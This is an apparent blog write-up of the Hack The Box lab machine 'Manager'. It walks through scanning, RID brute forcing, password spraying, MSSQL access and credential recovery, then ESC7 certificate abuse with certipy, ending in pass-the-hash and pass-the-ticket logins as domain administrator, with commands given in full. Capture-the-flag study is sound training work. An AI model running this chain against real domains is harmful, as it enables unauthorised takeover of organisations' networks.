<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Manager</title>
<meta name=description content="Platform: Hack The Box Link: Manager Level: Medium OS: Windows Manager is featuring a Windows server 2019 running Active Directory and a MSSQL database in …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-manager/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Manager"><meta property="og:description" content="Platform: Hack The Box Link: Manager Level: Medium OS: Windows Manager is featuring a Windows server 2019 running Active Directory and a MSSQL database in …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Manager/Manager.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Manager/Manager.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Manager"><meta name=twitter:description content="Platform: Hack The Box Link: Manager Level: Medium OS: Windows Manager is featuring a Windows server 2019 running Active Directory and a MSSQL database in …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-manager/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-manager/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Manager/Manager.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-manager/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-manager/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Manager</h1><small role=doc-subtitle></small><p class=post-date>8 min read |
<span class=post-date>March 15, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/Manager>Manager</a></li><li>Level: Medium</li><li>OS: Windows</li></ul><hr><p>Manager is featuring a Windows server 2019 running Active Directory and a MSSQL database in addtion to various other services. The target is vulnerable to RID brute forcing and ESC7 (Vulnerable Certificate Authority Access Control).</p><p>The target IP address is <code>10.10.11.236</code></p><h2 id=scanning>Scanning</h2><p>I first check all the open ports.</p><pre tabindex=0><code>nmap 10.10.11.236 -p- -T4 -Pn --open
</code></pre><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-03-13 13:38 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.236
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.048s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>65514</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span></span><span style=display:flex><span>PORT      STATE SERVICE
</span></span><span style=display:flex><span>53/tcp    open  domain
</span></span><span style=display:flex><span>80/tcp    open  http
</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec
</span></span><span style=display:flex><span>135/tcp   open  msrpc
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn
</span></span><span style=display:flex><span>389/tcp   open  ldap
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds
</span></span><span style=display:flex><span>464/tcp   open  kpasswd5
</span></span><span style=display:flex><span>593/tcp   open  http-rpc-epmap
</span></span><span style=display:flex><span>636/tcp   open  ldapssl
</span></span><span style=display:flex><span>1433/tcp  open  ms-sql-s
</span></span><span style=display:flex><span>3268/tcp  open  globalcatLDAP
</span></span><span style=display:flex><span>3269/tcp  open  globalcatLDAPssl
</span></span><span style=display:flex><span>5985/tcp  open  wsman
</span></span><span style=display:flex><span>9389/tcp  open  adws
</span></span><span style=display:flex><span>49667/tcp open  unknown
</span></span><span style=display:flex><span>49669/tcp open  unknown
</span></span><span style=display:flex><span>49671/tcp open  unknown
</span></span><span style=display:flex><span>49727/tcp open  unknown
</span></span><span style=display:flex><span>57702/tcp open  unknown
</span></span><span style=display:flex><span>58902/tcp open  unknown
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 107.12 seconds
</span></span></code></pre></div><p>And I run another scan to get more information about services and their versions.</p><pre tabindex=0><code>nmap -sC -sV --open 10.10.11.236
</code></pre><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-03-13 13:46 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.236
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.048s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>987</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp   open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>80/tcp   open  http          Microsoft IIS httpd 10.0
</span></span><span style=display:flex><span>|_http-title: Manager
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style=display:flex><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2024-03-14 01:45:32Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m40s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>dc01.manager.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-07-30T13:51:28
</span></span><span style=display:flex><span>|_Not valid after:  2024-07-29T13:51:28
</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp  open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m41s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>dc01.manager.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-07-30T13:51:28
</span></span><span style=display:flex><span>|_Not valid after:  2024-07-29T13:51:28
</span></span><span style=display:flex><span>1433/tcp open  ms-sql-s      Microsoft SQL Server <span style=color:#d19a66>2019</span> 15.00.2000.00; RTM
</span></span><span style=display:flex><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m40s from scanner time.
</span></span><span style=display:flex><span>| ms-sql-ntlm-info: 
</span></span><span style=display:flex><span>|   10.10.11.236:1433: 
</span></span><span style=display:flex><span>|     Target_Name: MANAGER
</span></span><span style=display:flex><span>|     NetBIOS_Domain_Name: MANAGER
</span></span><span style=display:flex><span>|     NetBIOS_Computer_Name: DC01
</span></span><span style=display:flex><span>|     DNS_Domain_Name: manager.htb
</span></span><span style=display:flex><span>|     DNS_Computer_Name: dc01.manager.htb
</span></span><span style=display:flex><span>|     DNS_Tree_Name: manager.htb
</span></span><span style=display:flex><span>|_    Product_Version: 10.0.17763
</span></span><span style=display:flex><span>| ms-sql-info: 
</span></span><span style=display:flex><span>|   10.10.11.236:1433: 
</span></span><span style=display:flex><span>|     Version: 
</span></span><span style=display:flex><span>|       name: Microsoft SQL Server <span style=color:#d19a66>2019</span> RTM
</span></span><span style=display:flex><span>|       number: 15.00.2000.00
</span></span><span style=display:flex><span>|       Product: Microsoft SQL Server <span style=color:#d19a66>2019</span>
</span></span><span style=display:flex><span>|       Service pack level: RTM
</span></span><span style=display:flex><span>|       Post-SP patches applied: <span style=color:#e5c07b>false</span>
</span></span><span style=display:flex><span>|_    TCP port: <span style=color:#d19a66>1433</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>SSL_Self_Signed_Fallback
</span></span><span style=display:flex><span>| Not valid before: 2024-03-06T12:01:23
</span></span><span style=display:flex><span>|_Not valid after:  2054-03-06T12:01:23
</span></span><span style=display:flex><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>dc01.manager.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-07-30T13:51:28
</span></span><span style=display:flex><span>|_Not valid after:  2024-07-29T13:51:28
</span></span><span style=display:flex><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m40s from scanner time.
</span></span><span style=display:flex><span>3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>dc01.manager.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-07-30T13:51:28
</span></span><span style=display:flex><span>|_Not valid after:  2024-07-29T13:51:28
</span></span><span style=display:flex><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m41s from scanner time.
</span></span><span style=display:flex><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-03-14T01:46:19
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>|_clock-skew: mean: 6h58m40s, deviation: 0s, median: 6h58m39s
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 95.25 seconds
</span></span></code></pre></div><p>Many services are running on this machine, I notice the domain controller <code>manager.htb</code> and I add it to the <code>/etc/hosts</code> file.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.236 manager.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>The website does not provide anything valuable, it is a basic static website with no working functionalities.</p><p><img src=/images/HTB-Manager/website.png alt=Manager-Website></p><p>Gobuster does not provide anything valuable either.</p><p>I then try to enumerate SMB. I can access it as a guest but there is nothing of interest here.</p><pre tabindex=0><code>smbmap -H 10.10.11.236 -u guest
</code></pre><p><img src=/images/HTB-Manager/smb-guest.png alt=SMB-guest-login></p><p>I know that Active Directory is running on the target so I attempt RID brute forcing.</p><blockquote><p>RID stands for Relative Identifier. It is a unique identifier assigned to each security principal (such as users, groups, and computers) within a Windows domain. RID brute forcing, also known as RID cycling or RID enumeration, is a technique used by attackers to identify valid user accounts within a Windows domain by guessing or cycling through RID values.</p></blockquote><pre tabindex=0><code>crackmapexec smb manager.htb -u guest -p &#39;&#39; --rid-brute
</code></pre><p><img src=/images/HTB-Manager/rid-bruteforcing.png alt=RID-Brute-forcing></p><p>I only want the lines with the usernames so I copy them into a file (start from user <code>Zhong</code>).</p><p><img src=/images/HTB-Manager/smb-list.png alt=Users-from-RID-brute-forcing></p><p>I extract the usernames from it and I send the output to another file.</p><pre tabindex=0><code>awk -F&#39;: &#39; &#39;{split($NF, a, &#34;\\&#34;); split(a[2], b, &#34; &#34;); print tolower(b[1])}&#39; smb-output.txt &gt; smb-users.txt
</code></pre><p><img src=/images/HTB-Manager/smb-users.png alt=Domain-users-list></p><p>Now I test if some users have their passwords as their username.</p><pre tabindex=0><code>crackmapexec smb manager.htb -u $(cat ~/Machines/HTB/Manager/smb-users.txt) -p $(cat ~/Machines/HTB/Manager/smb-users.txt) --continue-on-success
</code></pre><p>The pair <code>operator:operator</code> is successful!</p><p><img src=/images/HTB-Manager/smb-login.png alt=SMB-login-credentials></p><p>There are no shares accessible with this user so I turned my attention to the MSSQL database.</p><pre tabindex=0><code>crackmapexec mssql manager.htb -u operator -p operator
</code></pre><p>Turns out I can access the database with those same smb credentials.</p><p><img src=/images/HTB-Manager/MSSQL-login.png alt=MSSQL-login-credentials></p><pre tabindex=0><code>impacket-mssqlclient operator:operator@dc01.manager.htb -windows-auth
</code></pre><p><img src=/images/HTB-Manager/MSSQL-ACCESS.png alt=MSSQL-database-accessed></p><p>I try enabling <code>xp_cmdshell</code> but it fails.</p><blockquote><p><code>xp_cmdshell</code> is a system stored procedure in Microsoft SQL Server that allows users to execute operating system commands directly from within SQL Server. It is a powerful feature that provides a way to interact with the underlying operating system from within the SQL Server environment.</p></blockquote><p><img src=/images/HTB-Manager/xp-cmdshell.png alt=xp-cmdshell-failure></p><p>I list the directories with <code>xp_dirtree</code>, Microsoft IIS web root is found at <code>C:\inetpub\wwwroot</code>.</p><pre tabindex=0><code>xp_dirtree C:\inetpub\wwwroot
</code></pre><p><img src=/images/HTB-Manager/xp_dirtree.png alt=MSSQL-database-accessed></p><p>I see a backup file called <code>website-backup-27-07-23-old.zip</code> that I download with <code>wget http://manager.htb/website-backup-27-07-23-old.zip -O backup.zip</code>.</p><p>After unziping the archive I notice a hidden file called <code>.old-conf.xml</code>.</p><p><img src=/images/HTB-Manager/xml-file.png alt=old-conf-xml-file></p><p>It contains credentials for the user <code>raven</code>.</p><p><img src=/images/HTB-Manager/raven-user-credentials.png alt=raven-user-credentials></p><h2 id=initial-foothold>Initial Foothold</h2><blockquote><p>From the nmap results I know that port <code>5985</code> was open, which is typically used for <code>WinRM (Windows Remote Management)</code> service.</p></blockquote><p>These credentials allow me to get a foothold on the target.</p><pre tabindex=0><code>evil-winrm -u raven -p &#39;R4v3nBe5tD3veloP3r!123&#39; -i manager.htb
</code></pre><p><img src=/images/HTB-Manager/foothold.png alt=Foothold-via-evil-WinRM></p><p>The user flag <code>user.txt</code> is at <code>C:\Users\Raven\Desktop\user.txt</code>.</p><p><img src=/images/HTB-Manager/user-flag.png alt=Foothold-via-evil-WinRM></p><p>I get more information about the system just in case I need to look for some vulnerabilities specific to the OS version. I do so with <code>get-computerinfo</code>.</p><p><img src=/images/HTB-Manager/computerinfo.png alt=Target-system-info></p><p>Knowing that I am in an Active Directory environment I check the access rights of the users with <code>certify</code>, the executable is available <a href=https://github.com/r3motecontrol/Ghostpack-CompiledBinaries>here</a>.</p><p><img src=/images/HTB-Manager/CA-rights.png alt=Principal-rights-enumeration></p><p>The user <code>raven</code> has the the rights to manage the Certificate Authority and to request and enroll certificates from the Certificate Authority.</p><p>The CA used is <code>manager-DC01-CA</code>.</p><p><img src=/images/HTB-Manager/certutil.png alt=Certificate-Authority-information></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>The certificate vulnerability (ESC7) exploitation is explained in details <a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2>here</a>.</p><blockquote><p>&ldquo;The technique relies on the fact that users with the <code>Manage CA</code> and <code>Manage Certificates</code> access right can issue failed certificate requests. The <code>SubCA</code>
certificate template is vulnerable to ESC1, but only administrators can enroll in the template. Thus, a user can request to enroll in the <code>SubCA</code> - which will be denied - but then issued by the manager afterwards.&rdquo;</p></blockquote><ol><li>You grant yourself the <code>Manage Certificates</code> access right by adding the user as a new officer.</li></ol><pre tabindex=0><code>certipy ca -ca &#39;manager-DC01-CA&#39; -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236 -add-officer raven
</code></pre><p><img src=/images/HTB-Manager/CA1.png alt=Add-officer-Raven></p><ol start=2><li>The <code>SubCA</code> template can be <strong>enabled on the CA</strong> with the <code>-enable-template</code> parameter.</li></ol><pre tabindex=0><code>certipy ca -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236 -ca &#39;manager-DC01-CA&#39; -enable-template &#39;SubCA&#39;
</code></pre><p><img src=/images/HTB-Manager/CA2.png alt=Enable-SubCA></p><ol start=3><li>We start by requesting a certificate based on the SubCA template. This request will be denied, but we will save the private key and note down the request ID. make sure you are running the command from a directory where you have writing rights, otherwise the <code>.key</code> will not be written.</li></ol><pre tabindex=0><code>certipy req -ca &#39;manager-DC01-CA&#39; -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236 -template SubCA -upn administrator@manager.htb
</code></pre><p><img src=/images/HTB-Manager/CA3.png alt=Certificate-private-key></p><ol start=4><li>With the <code>Request ID</code>, issue a certificate. You do so with <code>-issue-request &lt;request ID></code></li></ol><pre tabindex=0><code>certipy ca -ca &#39;manager-DC01-CA&#39; -issue-request 24 -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236
</code></pre><p><img src=/images/HTB-Manager/CA4.png alt=Certificate-issued-successfully></p><ol start=5><li>Retrieve the issued certificate with the <code>req</code> command and the <code>-retrieve &lt;request ID></code> parameter.</li></ol><pre tabindex=0><code>certipy req -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -ca manager-DC01-CA -target manager.htb -retrieve 24 -dc-ip 10.10.11.236
</code></pre><p><img src=/images/HTB-Manager/CA5.png alt=Certificate-retrieved></p><ol start=6><li>The execution of the next commands will require clock synchronization with the DC. In order for this to work, we can use <code>ntpdate</code>.</li></ol><blockquote><p>This step is very time sensitive, you need to run these commands quickly. If you aren&rsquo;t able to make it work, I recommend chaining the commands together after running <code>sudo ntpdate -u manager.htb</code>.</p></blockquote><p>Failing to execute the commands fast enough will lead to this error.</p><p><img src=/images/HTB-Manager/Clock-error.png alt=Clock-skew-error></p><p>Run the command below and quickly execute the second command with <code>certipy auth</code>.</p><pre tabindex=0><code>sudo ntpdate -u manager.htb
</code></pre><p><img src=/images/HTB-Manager/CLOCK-SYNC.png alt=ntpdate-clock-sync></p><pre tabindex=0><code>certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
</code></pre><p>We get a TGT ticket and the administrator hash. Both can be used to get administrative privileges. You can login with the hash using <code>evil-winrm</code> or you can pass the ticket with <code>impacket</code>.</p><p><img src=/images/HTB-Manager/CA6.png alt=TGT-Ticket-and-admin-hash></p><h3 id=evil-winrm-method>evil-winrm method</h3><pre tabindex=0><code>evil-winrm -i 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef
</code></pre><p><img src=/images/HTB-Manager/evil-winrm-root.png alt=admin-shell-evil-WinRM></p><h3 id=pass-the-ticket-method>Pass the ticket method</h3><blockquote><p>This method is subject to <code>Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code> so you will need to to reuse the <code>ntpdate</code> command again before using <code>impacket</code>.</p></blockquote><p>To pass the ticket I first need to export it. You can read more about it <a href=https://www.thehacker.recipes/a-d/movement/kerberos/pass-the-certificate>here</a>.</p><pre tabindex=0><code>export KRB5CCNAME=administrator.ccache
</code></pre><p>Then I login to the DC</p><pre tabindex=0><code>python3 /usr/share/doc/python3-impacket/examples/psexec.py manager.htb/administrator@dc01 -k -no-pass -dc-ip 10.10.11.236 -target-ip 10.10.11.236
</code></pre><p>And we are in with a privileged account!</p><p><img src=/images/HTB-Manager/CA7.png alt=Impacket-privileged-account></p><h3 id=chained-commands-method>Chained commands method</h3><p>Chaining the commands might be the solution for you if you are unable to run them fast enough individually. Still you will probably need to try multiple times, just remember to be fast.</p><pre tabindex=0><code>sudo ntpdate -u manager.htb
</code></pre><pre tabindex=0><code>certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236 &amp;&amp; export KRB5CCNAME=administrator.ccache &amp;&amp; python3 /usr/share/doc/python3-impacket/examples/psexec.py manager.htb/administrator@dc01 -k -no-pass -dc-ip 10.10.11.236 -target-ip 10.10.11.236
</code></pre><p><img src=/images/HTB-Manager/CA-chain-cmds.png alt=ESC7-with-chained-commands></p><p>The root flag <code>root.txt</code> is at <code>c:\Users\Administrator\Desktop</code></p><p><img src=/images/HTB-Manager/root-flag.png alt=root-flag></p><p>This is all for this machine, I hope this writeup for helpful! Stay tuned for more and feel free to reach me out on X at <a href=https://twitter.com/_KScorpio>@_KScorpio</a>.</p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-cozyhosting/>&#8592;
Previous:
HTB: CozyHosting</a></p><p class=prev-post-date>March 2, 2024</p></div><div class=next-post><p><a href=/posts/thm-hacksmartersecurity/>Next:
THM: Hack Smarter Security
&#8594;</a></p><p class=next-post-date>March 22, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#evil-winrm-method>evil-winrm method</a></li><li><a href=#pass-the-ticket-method>Pass the ticket method</a></li><li><a href=#chained-commands-method>Chained commands method</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>